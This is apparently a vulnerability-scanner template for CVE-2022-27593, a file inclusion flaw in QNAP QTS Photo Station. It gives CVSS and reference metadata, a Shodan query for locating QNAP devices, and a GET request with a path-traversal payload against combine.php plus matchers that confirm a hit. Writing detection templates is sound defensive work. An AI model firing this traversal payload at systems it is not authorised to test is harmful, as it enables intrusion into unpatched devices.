id: CVE-2022-27593
info:
  name: QNAP QTS Photo Station External Reference - Local File Inclusion
  author: allenwest24
  severity: critical
  description: QNAP QTS Photo Station External Reference is a vulnerable software
    that can be exploited to modify system files, but the issue has been resolved
    in various versions of the software.
  reference:
  - https://attackerkb.com/topics/7We3SjEYVo/cve-2022-27593
  - https://www.qnap.com/en/security-advisory/qsa-22-24
  - https://nvd.nist.gov/vuln/detail/CVE-2022-27593
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 9.1
    cve-id: CVE-2022-27593
    cwe-id: CWE-610
  metadata:
    verified: true
    shodan-query: title:"QNAP"
    impact: Exploiting CVE-2022-27593 could allow an attacker to modify system files,
      but the impact has been mitigated by fixing the vulnerability in updated versions
      of QNAP QTS Photo Station.
    recommendation: It is highly recommended that QNAP QTS users update to the fixed
      versions of Photo Station to prevent local file inclusion and avoid the risk
      of system files being modified by attackers.
  tags: cve,cve2022,qnap,lfi,kev
requests:
- method: GET
  path:
  - '{{BaseURL}}/photo/combine.php?type=javascript&g=core-r7rules/../../../hello.php.'
  matchers-condition: and
  matchers:
  - type: word
    part: response
    words:
    - '!function(p,qa){'
    - module.exports
    - application/javascript
    condition: and
  - type: status
    status:
    - 200
